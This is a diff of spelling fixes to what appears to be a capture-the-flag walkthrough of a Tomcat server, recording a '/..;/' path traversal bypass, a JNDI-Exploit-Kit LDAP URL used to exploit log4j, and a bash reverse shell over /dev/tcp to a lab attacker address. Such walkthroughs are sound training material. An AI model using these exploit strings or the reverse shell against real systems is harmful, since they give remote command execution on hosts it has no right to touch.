@@ -30,7 +30,7 @@ created: 2025-09-30
 
 **🛠️ Tools:**  
 
-- `BurpSuite`
+- `Burp Suite`
 - `creds`
 - `JNDI-Exploit-Kit` (required to exploit `log4j`)
 - `jd-gui`
@@ -64,13 +64,13 @@ Directory fuzzing found nothing else, and nothing hinted at subdomains. I decide
 
 The web server was `Tomcat`. I enumerated for vulnerabilities and struggled to find anything. All the `Tomcat` paths were properly rejecting my requests, giving me 403 forbidden responses. However, I was sure that the foothold had something to do with `Tomcat`, so I kept trying.
 
-I found [this cheatsheet](https://kashz.gitbook.io/kashz-jewels/services/tomcat) on pentesting `Tomcat`, which shows it can vulnerable to path traversal with the string `/..;/`, which `Tomcat` normalizes. We use `/images/` directory as a base and go one directory up.
+I found [this cheatsheet](https://kashz.gitbook.io/kashz-jewels/services/tomcat) on pentesting `Tomcat`, which shows it can be vulnerable to path traversal with the string `/..;/`, which `Tomcat` normalizes. We use `/images/` directory as a base and go one directory up.
 
 And it worked:
 
 ![[Pasted image 20250930113813.png]]
 
-It's no longer 403 Forbidden; it's asking for `HTTP` basic authentication. `BurpSuite` doesn't show the prompt, so let's try it in the browser.
+It's no longer 403 Forbidden; it's asking for `HTTP` basic authentication. `Burp Suite` doesn't show the prompt, so let's try it in the browser.
 
 ![[Pasted image 20250930114002.png]]
 
@@ -136,7 +136,7 @@ Instead of using a serialized payload, I used the kit's built-in command executi
 ldap://10.10.14.14:1389/serial/[payload_name]/exec_unix/[base64_command]
 ```
 
-I `base64`-encoded this payload: `/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.14/1234 0>&1'` and made the request in `BurpSuite`.
+I `base64`-encoded this payload: `/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.14/1234 0>&1'` and made the request in `Burp Suite`.
 
 ![[Pasted image 20250930142432.png]]
 
